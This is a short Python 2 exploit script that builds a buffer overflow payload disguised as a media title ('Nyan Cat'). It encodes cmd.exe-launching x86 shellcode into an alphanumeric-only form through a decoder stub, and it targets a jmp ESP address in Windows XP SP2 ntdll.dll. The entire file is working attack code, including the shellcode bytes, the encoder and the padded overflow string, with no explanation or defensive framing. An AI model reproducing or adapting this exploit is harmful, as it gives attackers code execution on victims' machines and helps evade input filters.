def encodeData(decoder, data, validValues):
    assert data.find("\0") == -1, "Shellcode must be NULL free"
    data += "\0" #End of shellcode
    encData = decoder[-2:]
    decoder = decoder[:-2]
    for p in range(len(data)):
        dByte = ord(data[p])
        pxByte = ord(encData[p+1])
        bx, by = encoder(dByte ^ pxByte, validValues)
        encData += chr(bx) + chr(by)
    return decoder + encData
 
def encoder(value, validValues): 
      for bx in validValues:
        imul = (bx * 0x30) & 0xFF
        for by in validValues:
            if imul ^ by == value: return [bx, by]
 
 
#Shellcode (e.g. run cmd.exe)
shellcode  = "\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B\xE0\x55\x8B\xEC"
shellcode += "\x33\xFF\x57\x83\xEC\x04\xC6\x45\xF8\x63\xC6\x45"
shellcode += "\xF9\x6D\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45"
shellcode += "\xFC\x65\xC6\x45\xFD\x78\xC6\x45\xFE\x65\x8D\x45"
shellcode += "\xF8\x50\xBB\xC7\x93\xBF\x77\xFF\xD3"
retAddress = "\xED\x1E\x94\x7C" # jmp ESP ntdll.dll WinXP SP2
shellcode += retAddress
 
 
#Arguments
fakeTitle  = "Greatest Hits of the Internet - Nyan Cat"
 
while fakeTitle[0]  == " ": fakeTitle = fakeTitle[1:]
while fakeTitle[-1] == " ": fakeTitle = fakeTitle[:-1]
for i in fakeTitle:
    if i not in "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz -":
        raise "Invalid characters in the fake title"
fakeTitle2 = fakeTitle.replace("-"," ")
while "  " in fakeTitle2: fakeTitle2 = fakeTitle2.replace("  "," ")
 
 
#Exploit
exploit =  fakeTitle+" "*1024+"1"*(1026-len(fakeTitle2)-1)
exploit += "dLMD" #RETN address
exploit += "XXAI" #ESP := Baseaddr of encoded payload
exploit += encodeData("TYhffffk4diFkDql02Dqm0D1CuEE", #Baseaddr of encoded payload := ESP
                      shellcode,
                      map(ord, list("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"))
                      )
print exploit